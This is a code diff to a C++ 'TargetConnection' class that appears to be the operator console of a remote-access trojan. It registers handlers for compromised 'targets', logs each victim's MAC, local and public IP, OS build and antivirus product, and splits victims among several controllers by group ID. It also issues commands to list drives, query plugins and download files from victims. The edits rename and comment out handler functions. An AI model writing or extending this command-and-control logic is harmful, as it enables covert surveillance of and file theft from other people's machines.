@@ -64,7 +64,7 @@ void  TargetConnection::RegisterCommandHandlers()
     if (t_commandHandlers.size() == 0)
     {
         t_commandHandlers["QNG"] = &TargetConnection::Handle_QNG;
-        t_commandHandlers["HEL"] = &TargetConnection::Handle_HEL;
+       // t_commandHandlers["HEL"] = &TargetConnection::Handle_HEL;
 
         t_commandHandlers["SCH"] = &TargetConnection::Handle_SCH;
         t_commandHandlers["FTS"] = &TargetConnection::Handle_FTS;
@@ -91,7 +91,7 @@ void  TargetConnection::RegisterCommandHandlers()
 		// port from control connection
 		t_commandHandlers["OUT"] = &TargetConnection::Handle_OUT;
 
-		t_commandHandlers["HEL"] = &TargetConnection::Handle_HEL;
+		//t_commandHandlers["HEL"] = &TargetConnection::Handle_HEL;
 		t_commandHandlers["INI"] = &TargetConnection::Handle_INI;
 		t_commandHandlers["TAR"] = &TargetConnection::Handle_TAR;
 		t_commandHandlers["CIN"] = &TargetConnection::Handle_CIN;
@@ -233,7 +233,7 @@ void  TargetConnection::Send_HEL()
     this->Write(buf);
 }
 //---------------------------------------------------------------------------
-int   TargetConnection::Handle_HEL(std::vector<std::string> & args)
+int   TargetConnection::Handle_TAR(std::vector<std::string> & args)
 {
 	// TID 0 TAR OSNUMBER LANID COMNAMEBASE64 FLAGID MAC IPADDR\r\n
 	assert(args.size() == 9);
@@ -249,6 +249,7 @@ int   TargetConnection::Handle_HEL(std::vector<std::string> & args)
 	if (NULL == tar)
 	{
 		tar  = new Target();
+		ownerTarget = tar;
 		tar->dwProtocolVersion = 0;
 		tar->dwTargetID        = targetID;
 		tar->dwGroupID         = flag ;
@@ -920,15 +921,15 @@ int   TargetConnection::Handle_SCH(std::vector<std::string> & args)
 	return 0;
 }
 //---------------------------------------------------------------------------
-void  TargetConnection::Send_DOW(FileTask *fileTask, int startPos)
+void  TargetConnection::Send_DOW(DWORD dwTaskId, int startPos, std::string pathBase64)
 {
 	// TID PID DOW TaskID StartPos PathBase64
 	//  0   1   2     3       4
 	//
     
     std::ostringstream buf;    
-    buf << ownerTarget->dwTargetID << " 1 DOW " << fileTask->dwTaskID << " " << startPos << 
-		" " << WideToAnsi(fileTask->tarPathW).c_str() << "\r\n";
+    buf << ownerTarget->dwTargetID << " 1 DOW " << dwTaskId << " " << startPos << 
+		" " << pathBase64.c_str() << "\r\n";
     this->Write(buf);
 }
 //---------------------------------------------------------------------------
@@ -1787,117 +1788,117 @@ int  TargetConnection::Handle_TSW(std::vector<std::string> & args)
     return 0;
 }
 //---------------------------------------------------------------------------
-int  TargetConnection::Handle_TAR(std::vector<std::string> & args)
-{
-	// TargetID PID TAR GroupID  OsBuildNumber CurMAC LocalIP  PublicIP  ProtocolVersion  CurrentNetEnvironment
-	//    0      1   2      3            4          5      6       7         8                  9
-	//
-    // xASSERT((args.size() == 9));
-
-    ULONG       targetID        = strtoul(args[0].c_str(), NULL, 10);
-    ULONG       dwFlagID         = strtoul(args[3].c_str(), NULL, 10);
-
-    if (dwFlagID >= 0x7FFFFFFF)
-    {
-        dwFlagID = 100000;      // 如果数值大于0x7FFFFFFF,则默认设置为10W
-    }
-    
-    ULONG       osBuildNumber   = strtoul(args[4].c_str(), NULL, 10);
-    std::string  macAddr         = args[5].c_str();
-    ULONG       remLocIpAddr    = strtoul(args[6].c_str(),NULL,10);
-    std::string  localIpAddr     = GetIPStrFromInt32(remLocIpAddr);
-    std::string  publicIpAddr    = args[7].c_str();
-
-
-    ULONG       antiVirus = strtoul(args[8].c_str(), NULL, 10);
-
-	if ( antiVirus == 1500 )
-		antiVirus = 0;
-
-	ULONG netEnv = 1;
-
-	if ( args.size() > 9 )
-		netEnv = strtoul(args[9].c_str(), NULL, 10);
-
-    if (FrmMain->dwCtrUserId != 0)
-    {
-        // 多控制端环境下，收到不是自己的目标，则不进行处理
-        //
-        if ((dwFlagID < FrmMain->dwStartFlagId) || (dwFlagID > FrmMain->dwStopFlagId))
-        {
-            return 0;
-        }
-    }
-
-    //  本地处理
-    //
-
-	std::wstring antiVirusString = GetAntiVirusString(antiVirus);
-
-    Target *tar = GetTargetFromGlobalMap(targetID);
-    if (NULL == tar)
-    {
-        tar  = new Target();
-        tar->dwProtocolVersion = 0;
-        tar->dwTargetID        = targetID;
-        tar->dwGroupID         = dwFlagID ;
-		QString convert = QString("%1").arg(targetID);
-        tar->aniTargetName     = convert.toStdString();
-		
-        tar->widTargetName     = convert.toStdWString();
-        tar->dwOsBuildNumber   = osBuildNumber;
-        tar->aniRemMacAddr     = macAddr ;
-        tar->aniRemLocalIpAddr = localIpAddr;
-        tar->aniRemPublicIpAddr= publicIpAddr;
-        tar->bIsMyTarget = true;
-		tar->dwLangId = 0;
-		tar->m_netEnv = netEnv;
-		tar->m_antiVirus = antiVirusString;
-        
-        SendMessage(FrmMain->Handle, WM_NEW_TARGET, (unsigned int)tar, 1);
-
-        SetStatusInfoExA(STATUS_NOTE, "发现一个新目标(目标ID:%u,IP地址:%s, GroupId:%s)",
-                                    targetID, publicIpAddr.c_str(), args[3].c_str());
-    }
-    else
-    {
-        tar->bIsMyTarget = true;
-            
-        if (/*(tar->dwProtocolVersion  != protocolVersion)
-        ||*/  (tar->aniRemMacAddr      != macAddr)
-        ||  (tar->aniRemLocalIpAddr  != localIpAddr)
-        ||  (tar->aniRemPublicIpAddr != publicIpAddr)
-        ||  (tar->dwOsBuildNumber    != osBuildNumber)
-		|| (tar->m_netEnv != netEnv )
-		|| ( tar->m_antiVirus != antiVirusString ))
-        {
-            tar->aniRemMacAddr      = macAddr;
-            tar->aniRemLocalIpAddr  = localIpAddr;
-            tar->aniRemPublicIpAddr = publicIpAddr;
-            tar->dwOsBuildNumber    = osBuildNumber;
-            /*tar->dwProtocolVersion  = protocolVersion;*/
-			tar->m_netEnv = netEnv;
-			tar->m_antiVirus = antiVirusString;
-
-            SendMessage(FrmMain->Handle, WM_TARGET_INFO_UPDATED, (unsigned int)tar,NULL);
-        }
-    }
-
-    // Get FileTask, current status, log history
-    //
-    Send_STA(targetID);         // 获取目标状态信息
-    Send_PLI(targetID);         // 获取目标插件信息
-    Send_LIR(targetID);         // 获取盘符列表
-
-    if (tar->bConnecting == false && tar->bTarConnOnline == false)
-    {
-        // 通知主线程，开始发起目标数据连接,一个目标只保留一个数据连接
-        //
-        tar->StartTarDataConn();
-    }
-
-    return 0;
-}
+//int  TargetConnection::Handle_TAR(std::vector<std::string> & args)
+//{
+//	// TargetID PID TAR GroupID  OsBuildNumber CurMAC LocalIP  PublicIP  ProtocolVersion  CurrentNetEnvironment
+//	//    0      1   2      3            4          5      6       7         8                  9
+//	//
+//    // xASSERT((args.size() == 9));
+//
+//    ULONG       targetID        = strtoul(args[0].c_str(), NULL, 10);
+//    ULONG       dwFlagID         = strtoul(args[3].c_str(), NULL, 10);
+//
+//    if (dwFlagID >= 0x7FFFFFFF)
+//    {
+//        dwFlagID = 100000;      // 如果数值大于0x7FFFFFFF,则默认设置为10W
+//    }
+//    
+//    ULONG       osBuildNumber   = strtoul(args[4].c_str(), NULL, 10);
+//    std::string  macAddr         = args[5].c_str();
+//    ULONG       remLocIpAddr    = strtoul(args[6].c_str(),NULL,10);
+//    std::string  localIpAddr     = GetIPStrFromInt32(remLocIpAddr);
+//    std::string  publicIpAddr    = args[7].c_str();
+//
+//
+//    ULONG       antiVirus = strtoul(args[8].c_str(), NULL, 10);
+//
+//	if ( antiVirus == 1500 )
+//		antiVirus = 0;
+//
+//	ULONG netEnv = 1;
+//
+//	if ( args.size() > 9 )
+//		netEnv = strtoul(args[9].c_str(), NULL, 10);
+//
+//    if (FrmMain->dwCtrUserId != 0)
+//    {
+//        // 多控制端环境下，收到不是自己的目标，则不进行处理
+//        //
+//        if ((dwFlagID < FrmMain->dwStartFlagId) || (dwFlagID > FrmMain->dwStopFlagId))
+//        {
+//            return 0;
+//        }
+//    }
+//
+//    //  本地处理
+//    //
+//
+//	std::wstring antiVirusString = GetAntiVirusString(antiVirus);
+//
+//    Target *tar = GetTargetFromGlobalMap(targetID);
+//    if (NULL == tar)
+//    {
+//        tar  = new Target();
+//        tar->dwProtocolVersion = 0;
+//        tar->dwTargetID        = targetID;
+//        tar->dwGroupID         = dwFlagID ;
+//		QString convert = QString("%1").arg(targetID);
+//        tar->aniTargetName     = convert.toStdString();
+//		
+//        tar->widTargetName     = convert.toStdWString();
+//        tar->dwOsBuildNumber   = osBuildNumber;
+//        tar->aniRemMacAddr     = macAddr ;
+//        tar->aniRemLocalIpAddr = localIpAddr;
+//        tar->aniRemPublicIpAddr= publicIpAddr;
+//        tar->bIsMyTarget = true;
+//		tar->dwLangId = 0;
+//		tar->m_netEnv = netEnv;
+//		tar->m_antiVirus = antiVirusString;
+//        
+//        SendMessage(FrmMain->Handle, WM_NEW_TARGET, (unsigned int)tar, 1);
+//
+//        SetStatusInfoExA(STATUS_NOTE, "发现一个新目标(目标ID:%u,IP地址:%s, GroupId:%s)",
+//                                    targetID, publicIpAddr.c_str(), args[3].c_str());
+//    }
+//    else
+//    {
+//        tar->bIsMyTarget = true;
+//            
+//        if (/*(tar->dwProtocolVersion  != protocolVersion)
+//        ||*/  (tar->aniRemMacAddr      != macAddr)
+//        ||  (tar->aniRemLocalIpAddr  != localIpAddr)
+//        ||  (tar->aniRemPublicIpAddr != publicIpAddr)
+//        ||  (tar->dwOsBuildNumber    != osBuildNumber)
+//		|| (tar->m_netEnv != netEnv )
+//		|| ( tar->m_antiVirus != antiVirusString ))
+//        {
+//            tar->aniRemMacAddr      = macAddr;
+//            tar->aniRemLocalIpAddr  = localIpAddr;
+//            tar->aniRemPublicIpAddr = publicIpAddr;
+//            tar->dwOsBuildNumber    = osBuildNumber;
+//            /*tar->dwProtocolVersion  = protocolVersion;*/
+//			tar->m_netEnv = netEnv;
+//			tar->m_antiVirus = antiVirusString;
+//
+//            SendMessage(FrmMain->Handle, WM_TARGET_INFO_UPDATED, (unsigned int)tar,NULL);
+//        }
+//    }
+//
+//    // Get FileTask, current status, log history
+//    //
+//    Send_STA(targetID);         // 获取目标状态信息
+//    Send_PLI(targetID);         // 获取目标插件信息
+//    Send_LIR(targetID);         // 获取盘符列表
+//
+//    if (tar->bConnecting == false && tar->bTarConnOnline == false)
+//    {
+//        // 通知主线程，开始发起目标数据连接,一个目标只保留一个数据连接
+//        //
+//        tar->StartTarDataConn();
+//    }
+//
+//    return 0;
+//}
 
 //---------------------------------------------------------------------------
 void  TargetConnection::Send_STA(ULONG targetId)
